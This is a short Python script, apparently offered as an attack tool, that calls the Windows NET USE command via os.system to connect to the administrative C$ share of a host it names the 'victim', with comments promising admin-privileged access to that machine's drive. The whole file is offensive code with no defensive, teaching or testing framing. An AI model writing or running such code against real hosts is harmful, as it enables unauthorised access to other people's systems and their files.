import os

def connect_to_share(victim_ip):
    # Run the NET USE command to connect to the network share with admin privileges
    command = f'NET USE \\\\{victim_ip}\\c$ /USER:{victim_ip}\\Victim'
    os.system(command)

def main():
    victim_ip = '10.10.101.100'  # Replace with the IP address of the victim
    connect_to_share(victim_ip)

    # Now you can access the network share \\victim-ip\c$ with admin privileges

if __name__ == '__main__':
    main()
